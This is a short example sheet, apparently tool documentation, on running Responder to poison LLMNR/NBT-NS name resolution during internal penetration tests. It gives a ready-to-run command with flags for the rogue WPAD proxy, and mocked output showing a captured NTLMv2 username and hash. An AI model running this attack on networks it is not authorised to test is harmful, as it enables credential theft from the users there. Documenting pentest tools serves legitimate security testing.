# Responder Examples

## Scenario: Demonstrating LLMNR/NBT-NS Poisoning
Responder is used during internal penetration tests to demonstrate the risk of leaving broadcast name resolution protocols enabled on a network, which can lead to credential theft via intercepted NTLMv2 hashes.

**Command:**
```bash
sudo responder -I eth0 -rdw
```

**Mocked Output:**
```text
[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name FILESERVER
[*] [SMB] NTLMv2 Client   : 192.168.1.50
[*] [SMB] NTLMv2 Username : CORP\jdoe
[*] [SMB] NTLMv2 Hash     : jdoe::CORP:1122334455667788:00000000000000000000000000000000...
```

**Explanation:**
- `-I eth0`: Specifies the network interface to listen and respond on.
- `-r`: Enable answers for NetBIOS wpad and ISATAP queries.
- `-d`: Enable answers for NetBIOS domain suffix queries.
- `-w`: Start the WPAD rogue proxy server (demonstrating how attackers can capture web traffic credentials).
